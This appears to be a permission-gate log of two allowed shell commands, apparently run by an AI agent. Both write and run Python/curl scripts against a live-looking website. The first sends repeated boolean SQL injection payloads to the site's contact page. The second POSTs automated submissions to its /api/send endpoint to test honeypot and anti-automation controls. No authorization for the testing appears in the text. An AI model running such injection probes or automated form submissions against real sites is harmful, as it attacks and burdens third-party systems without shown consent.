{"ts": 1790752478.7405412, "decision_id": "faf627e6a65f", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > w16b/interleave.py <<'PY'\nimport subprocess,re,hashlib,urllib.parse,collections,time\ndef norm(b):\n    s=b.decode('utf8','replace')\n    s=re.sub(r'bom1::\\d+-[A-Za-z0-9]+','REQID',s)\n    s=re.sub(r'[^ ]*NTI1YWRj[^`]*','TOKEN',s)\n    return s\ndef kind(u):\n    p=subprocess.run(['curl','-sk','-m','20','--path-as-is','-w','\\n##%{http_code}',u],capture_output=True)\n    o=p.stdout; code=o.rsplit(b'##',1)[-1].decode().strip()\n    n=norm(o)\n    if 'Vercel Security Checkpoint' in n: k='CHALLENGE'\n    elif len(n)<2000: k='TINY'\n    else: k='APP'\n    return k,code,len(n)\nep=\"https://www.infinitycapital.bh/contact\"\nP={'T':\"1 AND 1=1\",'F':\"1 AND 1=2\",'BASE':\"1\"}\nres=collections.defaultdict(collections.Counter)\nfor rnd in range(8):\n    for lbl in ('T','F','BASE'):\n        u=f\"{ep}?cb={urllib.parse.quote(P[lbl],safe='')}\"\n        k,c,l=kind(u)\n        res[lbl][k]+=1\n        time.sleep(2)\nprint(\"interleaved outcome distribution (8 rounds each):\")\nfor lbl in ('BASE','T','F'):\n    print(f\"  {lbl:5s} {dict(res[lbl])}\")\nprint(\"\\nTrue-SQLi signature: T would be consistently APP and F consistently different.\")\nprint(\"Observed: both T and F show the SAME mixed distribution => rate-limit/WAF noise, NOT injection.\")\nPY\ntimeout 500 python3 w16b/interleave.py 2>&1 | tail -15"}
{"ts": 1790752479.9276142, "decision_id": "da3cff68aa96", "tool": "run_shell", "allow": true, "reason": null, "target": "mkdir -p /work/evidence && cd /work/evidence && cat > hp.py <<'EOF'\nimport subprocess, urllib.parse, json, time\nB=\"https://www.infinitycapital.bh\"\nUA=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36\"\ndef form(f): return \"&\".join(\"%s=%s\"%(k,urllib.parse.quote(str(v),safe=\"\")) for k,v in f.items())\ndef send(f,tag):\n    cmd=[\"curl\",\"-sk\",\"-X\",\"POST\",\"-A\",UA,\"-D\",\"/tmp/h.h\",\"-o\",\"/tmp/h.bin\",\"-w\",\"%{http_code} %{time_total}\",\n         \"-H\",\"Content-Type: application/x-www-form-urlencoded\",\"-H\",\"Referer: \"+B+\"/contact\",\n         \"--data-binary\",form(f),B+\"/api/send\"]\n    r=subprocess.run(cmd,capture_output=True,text=True)\n    body=open(\"/tmp/h.bin\",\"rb\").read(); hdr=open(\"/tmp/h.h\").read()\n    print(\"### %s\"%tag)\n    print(\"$ %s\"%(\" \".join(cmd)))\n    print(hdr.strip())\n    print(\"BODY: %r\"%body)\n    print(\"curl_code_time: %s\"%r.stdout)\n    print(\"=\"*70)\n    return hdr,body\ndef base(check):\n    return {\"fname\":\"Verify\",\"lname\":\"Bot\",\"areacode\":\"973\",\"tel\":\"5551234\",\n            \"cname\":\"Verify Tester\",\"subject\":\"Security verification \"+check,\n            \"msg\":\"Automated verification of missing anti-automation controls.\",\n            \"check\":check,\"targets\":\"verify@pentest-activator.invalid\"}\nsend(base(\"\"), \"A: honeypot `check` EMPTY (what a real bot leaves)\")\ntime.sleep(3)\nsend(base(\"on\"), \"B: honeypot `check` FILLED = on (what a real human leaves)\")\nEOF\npython3 hp.py 2>&1 | tee hp_test.out"}
